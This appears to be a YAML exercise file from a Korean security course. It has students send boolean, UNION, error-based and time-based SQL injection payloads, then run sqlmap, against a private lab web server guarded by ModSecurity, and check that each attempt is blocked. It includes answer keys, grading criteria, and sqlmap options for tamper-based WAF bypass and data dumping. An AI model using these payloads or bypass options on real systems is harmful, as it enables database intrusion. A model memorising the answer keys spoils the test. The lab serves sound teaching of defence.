lab_id: standalone-attack-week04
title: SQL Injection (OWASP A03) — sqlmap + DVWA + ModSec 우회 시도
version: standalone-non-ai
course: attack
week: 4
description: |
  SQLi 4 타입 (boolean / error / union / blind) 페이로드 + sqlmap 자동화 + ModSec
  의 942xxx 룰 차단 분석. ModSec 우회 (tamper script) 는 W10 학습.
difficulty: medium
duration_minutes: 150
prerequisites: [W03]
objectives:
  - "SQLi 4 타입 페이로드"
  - "sqlmap 자동화 + tamper 옵션"
  - "ModSec 942 룰 차단 분석"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 MISSION

      **SQLi 4 타입** payload 를 attacker 에서 발생 → ModSec 응답 코드 매트릭스.

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker '
      echo "=== Boolean tautology ==="
      curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+OR+1=1"
      echo "=== UNION ==="
      curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+UNION+SELECT+1,2,3--"
      echo "=== Error-based ==="
      curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+AND+extractvalue(1,concat(0x7e,version()))"
      echo "=== Blind time-based ==="
      time curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+AND+SLEEP(2)"
      '
      ```

      ## 📋 확인 사항

      - 4 타입 모두 403 (ModSec 942 차단)
      - Time-based 의 실 시간 — sleep 명령 실행 안 됨 (ModSec 즉시 차단 → < 0.5s)

      ## 💡 왜 이걸 하는가?

      OWASP A03 Injection — 가장 흔한 웹 취약점. SQLi 4 타입 매트릭스 학습.

      ## 🔍 결과 해석

      - **정상**: 4 × 403 + time 빠름 (즉시 차단)
      - **W10 학습**: ModSec 우회 (tamper) 로 일부 변형 통과 가능
    hint: SQLi 4 타입 → 403 매트릭스
    category: exploit
    points: 20
    answer: |
      ssh 6v6-attacker '
      curl -s -o /dev/null -w "boolean: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+OR+1=1"
      curl -s -o /dev/null -w "union: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+UNION+SELECT+1,2,3--"
      curl -s -o /dev/null -w "error: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+AND+extractvalue(1,1)"
      curl -s -o /dev/null -w "blind: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+AND+SLEEP(2)"
      '
    answer_detail: SQLi 4 타입 → 403 매트릭스.
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "SQLi 4 타입"
        success_criteria: ["4 × 403"]
        acceptable_methods:
          - "**[OSS] boolean tautology**"
          - "**[OSS] UNION SELECT**"
          - "**[OSS] error-based (extractvalue/updatexml)**"
          - "**[OSS] blind time-based (SLEEP)**"
          - "**[OSS] blind boolean-based (AND IF)**"
          - "**[OSS] ModSec 942100 libinjection**"
          - "**[OSS] CWE-89 + OWASP A03**"
          - "**[OSS] T1190 Exploit Public-Facing**"
    target_vm: attacker

  - order: 2
    instruction: |
      ## 🎯 MISSION (sqlmap 자동화)

      sqlmap 으로 자동 SQLi 탐지 + ModSec 차단 카운트.

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker 'timeout 45 sqlmap -u "http://10.20.30.1/?q=1" --batch --headers="Host: juice.6v6.lab" --random-agent 2>&1 | tail -15' || echo "sqlmap timeout"
      sleep 3
      ssh 6v6-web 'sudo grep -c "942" /var/log/apache2/modsec_audit.log | tail -1'
      ```

      ## 📋 확인 사항

      - sqlmap 출력의 "Parameter q ... not injectable" 또는 ModSec 차단 메시지
      - ModSec audit log 의 942xxx 매치 카운트 증가

      ## 💡 왜 이걸 하는가?

      sqlmap 은 SQLi 자동화 표준. ModSec 가 차단할 때까지 다양한 페이로드 시도.

      ## 🔍 결과 해석

      - **정상**: sqlmap 이 다수 페이로드 시도 + ModSec 942 매치 카운트 증가
      - **W10 학습**: `--tamper=space2comment,randomcase` 로 일부 우회 가능
    hint: sqlmap --batch + tamper
    category: exploit
    points: 25
    answer: |
      ssh 6v6-attacker 'timeout 45 sqlmap -u "http://10.20.30.1/?q=1" --batch --headers="Host: juice.6v6.lab" --random-agent 2>&1 | tail -15' || echo "timeout"
      sleep 3
      ssh 6v6-web 'sudo grep -c "942" /var/log/apache2/modsec_audit.log'
    answer_detail: sqlmap 자동화 + ModSec 942 카운트.
    verify:
      type: output_contains
      expect: 'sqlmap\|web'
      field: stdout
      semantic:
        intent: "sqlmap 자동화"
        success_criteria: ["sqlmap 실행 + 942 카운트"]
        acceptable_methods:
          - "**[OSS] sqlmap --batch (질문 자동 yes)**"
          - "**[OSS] --random-agent (UA 변경)**"
          - "**[OSS] --tamper=space2comment**"
          - "**[OSS] --tamper=randomcase**"
          - "**[OSS] --dbs / --tables / --dump**"
          - "**[OSS] --proxy=http://burp:8080**"
          - "**[OSS] --level / --risk**"
          - "**[OSS] --technique=BEUSTQ (Boolean/Error/Union/Stack/Time/inlineQuery)**"
    target_vm: attacker
